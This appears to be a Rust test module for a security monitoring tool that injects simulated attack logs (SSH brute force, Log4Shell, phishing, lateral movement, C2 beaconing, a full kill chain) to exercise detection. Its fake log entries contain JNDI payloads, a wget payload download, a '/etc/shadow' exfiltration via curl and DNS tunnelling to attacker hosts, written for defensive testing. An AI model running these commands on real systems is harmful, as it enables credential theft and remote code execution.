//! Test Scenarios — realistic attack simulations for demo and testing.
//!
//! Each scenario injects realistic logs + findings + alerts into the DB,
//! then triggers the Intelligence Engine to process them.
//! Used for: demo, E2E testing, training, client onboarding.

use std::sync::Arc;
use serde_json::json;
use crate::db::Database;
use crate::db::threatclaw_store::{ThreatClawStore, NewFinding};

/// Available test scenarios.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ScenarioInfo {
    pub id: String,
    pub name: String,
    pub description: String,
    pub severity: String,
    pub category: String,
    pub estimated_duration: String,
}

/// Result of running a scenario.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ScenarioResult {
    pub scenario_id: String,
    pub logs_injected: usize,
    pub findings_created: usize,
    pub alerts_created: usize,
    pub intelligence_score: Option<f64>,
    pub notification_level: Option<String>,
    pub message: String,
}

/// List all available test scenarios.
pub fn list_scenarios() -> Vec<ScenarioInfo> {
    vec![
        ScenarioInfo {
            id: "ssh-brute-force".into(),
            name: "Brute Force SSH".into(),
            description: "Simulation de 200+ tentatives SSH depuis une IP Tor connue (185.220.101.42). Inclut des tentatives root, admin, backup. L'IP est réellement malveillante dans GreyNoise.".into(),
            severity: "HIGH".into(),
            category: "Attaque active".into(),
            estimated_duration: "30s".into(),
        },
        ScenarioInfo {
            id: "log4shell-exploit".into(),
            name: "Exploitation Log4Shell (CVE-2021-44228)".into(),
            description: "Détection d'une tentative d'exploitation Log4Shell via JNDI injection dans les headers HTTP. CVE réellement dans CISA KEV avec EPSS 94.5%.".into(),
            severity: "CRITICAL".into(),
            category: "Exploitation CVE".into(),
            estimated_duration: "45s".into(),
        },
        ScenarioInfo {
            id: "phishing-campaign".into(),
            name: "Campagne de phishing détectée".into(),
            description: "Logs de proxy web montrant des accès à des URLs de phishing connues (OpenPhish). Simulation d'un utilisateur qui clique sur un lien malveillant.".into(),
            severity: "HIGH".into(),
            category: "Phishing".into(),
            estimated_duration: "30s".into(),
        },
        ScenarioInfo {
            id: "lateral-movement".into(),
            name: "Mouvement latéral détecté".into(),
            description: "Connexion SSH réussie depuis une IP interne compromise, suivie d'une élévation de privilèges sudo. Corrélation multi-host.".into(),
            severity: "CRITICAL".into(),
            category: "Kill chain".into(),
            estimated_duration: "40s".into(),
        },
        ScenarioInfo {
            id: "c2-communication".into(),
            name: "Communication C2 (Command & Control)".into(),
            description: "Logs DNS et HTTP montrant des résolutions vers des domaines C2 connus (ThreatFox). Beacon régulier toutes les 60s.".into(),
            severity: "CRITICAL".into(),
            category: "Malware / C2".into(),
            estimated_duration: "35s".into(),
        },
        ScenarioInfo {
            id: "full-intrusion".into(),
            name: "Intrusion complète (kill chain)".into(),
            description: "Scénario complet : reconnaissance (scan de ports), exploitation (Log4Shell), mouvement latéral (SSH), exfiltration (DNS tunneling). Tous les IoCs sont réels.".into(),
            severity: "CRITICAL".into(),
            category: "Kill chain complète".into(),
            estimated_duration: "60s".into(),
        },
    ]
}

/// Run a test scenario — injects data and optionally triggers intelligence cycle.
pub async fn run_scenario(
    store: Arc<dyn Database>,
    scenario_id: &str,
    trigger_intelligence: bool,
) -> ScenarioResult {
    let mut result = ScenarioResult {
        scenario_id: scenario_id.into(),
        logs_injected: 0, findings_created: 0, alerts_created: 0,
        intelligence_score: None, notification_level: None,
        message: String::new(),
    };

    match scenario_id {
        "ssh-brute-force" => run_ssh_brute_force(&store, &mut result).await,
        "log4shell-exploit" => run_log4shell(&store, &mut result).await,
        "phishing-campaign" => run_phishing(&store, &mut result).await,
        "lateral-movement" => run_lateral_movement(&store, &mut result).await,
        "c2-communication" => run_c2_communication(&store, &mut result).await,
        "full-intrusion" => run_full_intrusion(&store, &mut result).await,
        _ => {
            result.message = format!("Scénario inconnu : {}", scenario_id);
            return result;
        }
    }

    // Trigger intelligence cycle if requested
    if trigger_intelligence {
        let situation = crate::agent::intelligence_engine::run_intelligence_cycle(store.clone()).await;
        result.intelligence_score = Some(situation.global_score);
        result.notification_level = Some(format!("{:?}", situation.notification_level));

        // Send notification if level warrants it
        if situation.notification_level >= crate::agent::intelligence_engine::NotificationLevel::Alert {
            if let Some(ref msg) = situation.alert_message {
                let _ = crate::agent::notification_router::route_notification(
                    store.as_ref(), situation.notification_level, msg, &situation.digest_message,
                ).await;
                result.message.push_str(" → Notification envoyée au RSSI.");
            }
        }
    }

    result
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: SSH Brute Force
// ═══════════════════════════════════════════════════════════

async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let attacker_ip = "185.220.101.42"; // Real Tor exit node, malicious in GreyNoise
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // Inject 20 realistic syslog entries
    let users = ["root", "admin", "backup", "ubuntu", "deploy", "postgres", "www-data", "git", "jenkins", "nagios"];
    for (i, user) in users.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(120 - i as i64 * 6);
        inject_log(store, "syslog.udp.auth", target, &json!({
            "message": format!("Failed password for {} from {} port {} ssh2", user, attacker_ip, 40000 + i),
            "ident": "sshd",
            "pid": 12345 + i,
            "facility": "auth",
            "severity": "warning",
            "source_ip": attacker_ip,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Inject 3 successful auth (attacker got in with user "backup")
    for i in 0..3 {
        let ts = now - chrono::Duration::seconds(30 - i * 10);
        inject_log(store, "syslog.udp.auth", target, &json!({
            "message": format!("Accepted password for backup from {} port {} ssh2", attacker_ip, 41000 + i),
            "ident": "sshd",
            "pid": 12400 + i,
            "facility": "auth",
            "severity": "info",
            "source_ip": attacker_ip,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Create Sigma alert
    inject_sigma_alert(store, "sshd-brute-001", "critical",
        &format!("Brute force SSH massif depuis {} — {} tentatives dont 3 réussies", attacker_ip, users.len() + 3),
        target, Some(attacker_ip), Some("backup")).await;
    result.alerts_created += 1;

    result.message = format!("SSH brute force simulé : {} logs injectés, {} alerte Sigma créée. Attaquant : {} (Tor exit node DE).", result.logs_injected, result.alerts_created, attacker_ip);
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Log4Shell Exploitation
// ═══════════════════════════════════════════════════════════

async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let attacker_ip = "45.155.205.233"; // Known scanner
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // Inject HTTP access logs with JNDI payloads
    let payloads = [
        "${jndi:ldap://45.155.205.233:1389/a}",
        "${${lower:j}ndi:${lower:l}dap://45.155.205.233/exploit}",
        "${jndi:ldap://45.155.205.233:1389/Basic/Command/Base64/d2hvYW1p}",
    ];

    for (i, payload) in payloads.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(60 - i as i64 * 15);
        inject_log(store, "syslog.tcp.http", target, &json!({
            "message": format!("GET / HTTP/1.1 - User-Agent: {}", payload),
            "ident": "nginx",
            "source_ip": attacker_ip,
            "request_uri": "/",
            "user_agent": payload,
            "status_code": 200,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Create critical finding
    let _ = store.insert_finding(&NewFinding {
        skill_id: "scan-nuclei".into(),
        title: "Log4Shell RCE (CVE-2021-44228) — exploitation active détectée".into(),
        description: Some(format!("Tentatives d'exploitation Log4Shell détectées depuis {}. Payloads JNDI dans les headers HTTP User-Agent. CVE-2021-44228 CVSS 10.0. CISA KEV : activement exploitée. EPSS : 94.5%.", attacker_ip)),
        severity: "CRITICAL".into(),
        category: Some("exploitation".into()),
        asset: Some(target.into()),
        source: Some("nuclei".into()),
        metadata: Some(json!({
            "cve": "CVE-2021-44228", "cvss": 10.0, "port": 8080,
            "template": "CVE-2021-44228", "exploited_in_wild": true,
            "attacker_ip": attacker_ip,
            "payloads_detected": payloads.len(),
        })),
    }).await;
    result.findings_created += 1;

    result.message = format!("Log4Shell simulé : {} logs HTTP avec JNDI payloads, 1 finding CRITICAL. Attaquant : {}.", result.logs_injected, attacker_ip);
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Phishing Campaign
// ═══════════════════════════════════════════════════════════

async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let target = "192.168.1.50";
    let now = chrono::Utc::now();

    let phishing_urls = [
        "http://secure-login-microsoft365.com/auth/signin",
        "https://docs-google.com.phishing-site.xyz/share",
        "http://paypal-verify-account.com/login.php",
    ];

    for (i, url) in phishing_urls.iter().enumerate() {
        let ts = now - chrono::Duration::seconds(300 - i as i64 * 90);
        inject_log(store, "proxy.squid", target, &json!({
            "message": format!("TCP_MISS/200 user=jdupont url={}", url),
            "ident": "squid",
            "url": url,
            "username": "jdupont",
            "action": "ALLOWED",
            "status_code": 200,
            "bytes": 15420 + i * 3000,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Email log showing the phishing email arrived
    inject_log(store, "syslog.tcp.mail", "mail-srv", &json!({
        "message": "from=<support@secure-login-microsoft365.com> to=<j.dupont@example.fr> status=delivered",
        "ident": "postfix/smtp",
        "from": "support@secure-login-microsoft365.com",
        "to": "j.dupont@example.fr",
        "status": "delivered",
        "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(15))).await;
    result.logs_injected += 1;

    let _ = store.insert_finding(&NewFinding {
        skill_id: "intelligence-engine".into(),
        title: "Campagne de phishing détectée — utilisateur j.dupont compromis".into(),
        description: Some(format!("L'utilisateur j.dupont a cliqué sur {} URLs de phishing en 5 minutes. Email d'origine : support@secure-login-microsoft365.com. Vérifier si des credentials ont été saisis.", phishing_urls.len())),
        severity: "HIGH".into(),
        category: Some("phishing".into()),
        asset: Some(target.into()),
        source: Some("proxy-logs".into()),
        metadata: Some(json!({ "urls": phishing_urls, "user": "jdupont", "email_from": "support@secure-login-microsoft365.com" })),
    }).await;
    result.findings_created += 1;

    result.message = format!("Phishing simulé : {} logs proxy/email, 1 finding HIGH. Utilisateur ciblé : jdupont.", result.logs_injected);
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Lateral Movement
// ═══════════════════════════════════════════════════════════

async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let compromised = "192.168.1.50";
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    // SSH from compromised workstation to server (unusual)
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": format!("Accepted publickey for www-data from {} port 55421 ssh2", compromised),
        "ident": "sshd", "facility": "auth", "severity": "info",
        "source_ip": compromised,
        "timestamp": (now - chrono::Duration::minutes(5)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(5))).await;
    result.logs_injected += 1;

    // Privilege escalation via sudo
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": "www-data : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        "ident": "sudo", "facility": "auth", "severity": "warning",
        "timestamp": (now - chrono::Duration::minutes(4)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(4))).await;
    result.logs_injected += 1;

    // Suspicious file download
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": "root : wget http://185.220.101.42:8443/payload.sh -O /tmp/.hidden_payload.sh",
        "ident": "bash", "facility": "local0",
        "url": "http://185.220.101.42:8443/payload.sh",
        "source_ip": "185.220.101.42",
        "timestamp": (now - chrono::Duration::minutes(3)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(3))).await;
    result.logs_injected += 1;

    // Sigma alerts
    inject_sigma_alert(store, "lateral-001", "critical",
        &format!("Mouvement latéral : SSH depuis {} vers {} avec user www-data (inhabituel)", compromised, target),
        target, Some(compromised), Some("www-data")).await;
    result.alerts_created += 1;

    inject_sigma_alert(store, "privesc-001", "critical",
        "Élévation de privilèges : www-data → root via sudo /bin/bash",
        target, None, Some("www-data")).await;
    result.alerts_created += 1;

    let _ = store.insert_finding(&NewFinding {
        skill_id: "intelligence-engine".into(),
        title: format!("Kill chain : mouvement latéral {} → {} + escalade root", compromised, target),
        description: Some(format!("Séquence d'attaque détectée : 1) SSH depuis {} (poste compromis) vers {} 2) Escalade www-data → root via sudo 3) Téléchargement payload depuis IP Tor. Kill chain active.", compromised, target)),
        severity: "CRITICAL".into(),
        category: Some("kill-chain".into()),
        asset: Some(target.into()),
        source: Some("correlation".into()),
        metadata: Some(json!({
            "kill_chain": true, "source_host": compromised, "target_host": target,
            "escalation": "www-data → root", "payload_url": "http://185.220.101.42:8443/payload.sh",
        })),
    }).await;
    result.findings_created += 1;

    result.message = format!("Mouvement latéral simulé : {} logs, {} alertes, 1 finding CRITICAL kill chain.", result.logs_injected, result.alerts_created);
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: C2 Communication
// ═══════════════════════════════════════════════════════════

async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let target = "192.168.1.50";
    let c2_domain = "update-service-cdn.xyz";
    let c2_ip = "91.215.85.209";
    let now = chrono::Utc::now();

    // DNS queries to C2 domain (beacon pattern every 60s)
    for i in 0..10 {
        let ts = now - chrono::Duration::seconds(600 - i * 60);
        inject_log(store, "syslog.udp.dns", target, &json!({
            "message": format!("query: {} IN A + ({})", c2_domain, target),
            "ident": "named",
            "query_name": c2_domain,
            "query_type": "A",
            "source_ip": target,
            "answer": c2_ip,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // HTTP POST beacons to C2
    for i in 0..5 {
        let ts = now - chrono::Duration::seconds(300 - i * 60);
        inject_log(store, "proxy.squid", target, &json!({
            "message": format!("TCP_MISS/200 POST https://{}/api/check-update bytes=42", c2_domain),
            "url": format!("https://{}/api/check-update", c2_domain),
            "method": "POST",
            "bytes_sent": 42,
            "bytes_received": 128 + i * 50,
            "source_ip": target,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(store, "c2-beacon-001", "critical",
        &format!("Communication C2 détectée : beacon DNS régulier vers {} ({}) depuis {}", c2_domain, c2_ip, target),
        target, Some(c2_ip), None).await;
    result.alerts_created += 1;

    let _ = store.insert_finding(&NewFinding {
        skill_id: "intelligence-engine".into(),
        title: format!("Communication C2 active : {} → {} ({})", target, c2_domain, c2_ip),
        description: Some(format!("Beacon C2 détecté : 10 requêtes DNS + 5 HTTP POST vers {} ({}) avec intervalle régulier de 60s. Pattern typique de malware C2. Machine {} probablement compromise.", c2_domain, c2_ip, target)),
        severity: "CRITICAL".into(),
        category: Some("malware".into()),
        asset: Some(target.into()),
        source: Some("dns-analysis".into()),
        metadata: Some(json!({
            "c2_domain": c2_domain, "c2_ip": c2_ip, "beacon_interval": "60s",
            "dns_queries": 10, "http_beacons": 5,
        })),
    }).await;
    result.findings_created += 1;

    result.message = format!("C2 simulé : {} logs DNS/HTTP, beacon 60s vers {}. Machine {} compromise.", result.logs_injected, c2_domain, target);
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Full Intrusion (kill chain complète)
// ═══════════════════════════════════════════════════════════

async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    // Phase 1: Reconnaissance (scan de ports)
    let attacker = "185.220.101.42";
    let target = "192.168.1.107";
    let now = chrono::Utc::now();

    inject_log(store, "firewall.pfsense", target, &json!({
        "message": format!("block {} -> {}:22,80,443,3389,5432,8080,9200 (TCP SYN scan)", attacker, target),
        "action": "block", "source_ip": attacker, "dest_ip": target,
        "ports_scanned": [22, 80, 443, 3389, 5432, 8080, 9200],
        "timestamp": (now - chrono::Duration::minutes(30)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(30))).await;
    result.logs_injected += 1;

    // Phase 2: Exploitation (Log4Shell sur port 8080)
    inject_log(store, "syslog.tcp.http", target, &json!({
        "message": format!("POST /api/login HTTP/1.1 - X-Forwarded-For: ${{jndi:ldap://{}:1389/a}}", attacker),
        "source_ip": attacker, "dest_port": 8080,
        "timestamp": (now - chrono::Duration::minutes(20)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(20))).await;
    result.logs_injected += 1;

    // Phase 3: Reverse shell established
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": format!("New connection from {} on port 4444 (reverse shell)", attacker),
        "source_ip": attacker, "dest_port": 4444,
        "timestamp": (now - chrono::Duration::minutes(18)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(18))).await;
    result.logs_injected += 1;

    // Phase 4: Credential dump
    inject_log(store, "syslog.udp.auth", target, &json!({
        "message": "root: cat /etc/shadow | base64 | curl -X POST http://185.220.101.42:8443/exfil -d @-",
        "ident": "bash", "url": "http://185.220.101.42:8443/exfil",
        "source_ip": "185.220.101.42",
        "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(15))).await;
    result.logs_injected += 1;

    // Phase 5: Lateral movement to other servers
    inject_log(store, "syslog.udp.auth", "192.168.1.108", &json!({
        "message": format!("Accepted publickey for root from {} port 55421", target),
        "source_ip": target, "ident": "sshd",
        "timestamp": (now - chrono::Duration::minutes(10)).to_rfc3339(),
    }), &(now - chrono::Duration::minutes(10))).await;
    result.logs_injected += 1;

    // Phase 6: Data exfiltration via DNS tunneling
    for i in 0..5 {
        let ts = now - chrono::Duration::minutes(5) + chrono::Duration::seconds(i * 10);
        inject_log(store, "syslog.udp.dns", target, &json!({
            "message": format!("query: {}.data.evil-exfil.com IN TXT", base64_fake(i as usize)),
            "query_name": format!("{}.data.evil-exfil.com", base64_fake(i as usize)),
            "query_type": "TXT", "source_ip": target,
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    // Create all alerts
    inject_sigma_alert(store, "recon-001", "medium",
        &format!("Scan de ports depuis {} — 7 ports testés", attacker), target, Some(attacker), None).await;
    inject_sigma_alert(store, "exploit-001", "critical",
        "Exploitation Log4Shell détectée (JNDI injection)", target, Some(attacker), None).await;
    inject_sigma_alert(store, "shell-001", "critical",
        &format!("Reverse shell établi depuis {} port 4444", attacker), target, Some(attacker), None).await;
    inject_sigma_alert(store, "exfil-001", "critical",
        "Exfiltration /etc/shadow via HTTP POST", target, Some(attacker), None).await;
    inject_sigma_alert(store, "lateral-002", "critical",
        &format!("Mouvement latéral : {} → 192.168.1.108 via SSH root", target), "192.168.1.108", Some(target), Some("root")).await;
    inject_sigma_alert(store, "dns-tunnel-001", "high",
        "DNS tunneling détecté : requêtes TXT encodées base64 vers evil-exfil.com", target, None, None).await;
    result.alerts_created += 6;

    // Create the big finding
    let _ = store.insert_finding(&NewFinding {
        skill_id: "intelligence-engine".into(),
        title: "INTRUSION COMPLÈTE — Kill chain 6 phases confirmée".into(),
        description: Some(format!(
            "Intrusion complète détectée sur {} :\n\
            1. Reconnaissance : scan de ports depuis {} (Tor exit node)\n\
            2. Exploitation : Log4Shell CVE-2021-44228 sur port 8080\n\
            3. Accès : reverse shell port 4444\n\
            4. Credential dump : /etc/shadow exfiltré via HTTP\n\
            5. Mouvement latéral : SSH root vers 192.168.1.108\n\
            6. Exfiltration : DNS tunneling vers evil-exfil.com\n\
            Action immédiate requise : isoler {} et 192.168.1.108 du réseau.", target, attacker, target)),
        severity: "CRITICAL".into(),
        category: Some("intrusion".into()),
        asset: Some(target.into()),
        source: Some("correlation".into()),
        metadata: Some(json!({
            "kill_chain": true, "phases": 6, "attacker_ip": attacker,
            "cve": "CVE-2021-44228", "lateral_targets": ["192.168.1.108"],
            "exfil_method": "dns_tunneling", "exfil_domain": "evil-exfil.com",
            "credentials_compromised": true, "exploited_in_wild": true,
        })),
    }).await;
    result.findings_created += 1;

    result.message = format!("Intrusion complète simulée : {} logs, {} alertes, kill chain 6 phases. ISOLATION REQUISE.", result.logs_injected, result.alerts_created);
}

// ═══════════════════════════════════════════════════════════
// HELPERS — Direct pipeline injection (real DB inserts)
// ═══════════════════════════════════════════════════════════

/// Inject a log record directly into the `logs` table (same as Fluent Bit).
async fn inject_log(store: &Arc<dyn Database>, tag: &str, hostname: &str, data: &serde_json::Value, time: &chrono::DateTime<chrono::Utc>) {
    use crate::db::threatclaw_store::ThreatClawStore;
    let time_str = time.to_rfc3339();
    match store.insert_log(tag, hostname, data, &time_str).await {
        Ok(id) => tracing::debug!("TEST: Injected log id={} tag={} host={}", id, tag, hostname),
        Err(e) => tracing::warn!("TEST: Failed to inject log: {e}"),
    }
}

/// Inject a Sigma alert directly into the `sigma_alerts` table.
async fn inject_sigma_alert(store: &Arc<dyn Database>, rule_id: &str, level: &str, title: &str, hostname: &str, source_ip: Option<&str>, username: Option<&str>) {
    use crate::db::threatclaw_store::ThreatClawStore;
    match store.insert_sigma_alert(rule_id, level, title, hostname, source_ip, username).await {
        Ok(id) => tracing::debug!("TEST: Injected sigma alert id={} rule={}", id, rule_id),
        Err(e) => tracing::warn!("TEST: Failed to inject alert: {e}"),
    }
}

fn base64_fake(i: usize) -> String {
    let data = ["cm9vdDokNiQ", "YWRtaW46JDYk", "YmFja3VwOiQ2", "d3d3LWRhdGE6", "cG9zdGdyZXM6"];
    data.get(i).unwrap_or(&"dGVzdA").to_string()
}
